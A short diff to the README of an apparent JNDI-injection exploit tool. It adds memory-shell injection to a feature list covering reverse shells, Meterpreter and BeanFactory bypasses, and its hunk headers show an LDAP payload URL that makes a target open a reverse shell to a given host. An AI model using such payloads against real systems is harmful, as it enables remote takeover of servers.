@@ -39,6 +39,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - Spawn reverse shell
 - Spawn Meterpreter 
 - Load custom Java bytecode
+- MemShell injection (based on [MemShellParty](https://github.com/ReaJason/MemShellParty))
 - Customize payload based on Nashorn JS engine
 - BeanFactory Bypass
     - Tomcat
@@ -70,6 +71,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [Usage](USAGE.en.md#usage)
 - [URL Format](USAGE.en.md#url-format)
 - [Basic Functions](USAGE.en.md#basic-functions)
+- [MemShell Injection](USAGE.en.md#memshell-injection)
 - [BeanFactory Bypass](USAGE.en.md#beanfactory-bypass)
     - [Tomcat ELProcessor](USAGE.en.md#tomcat-elprocessor)
     - [Groovy ClassLoader/Shell](USAGE.en.md#groovy-classloadershell)
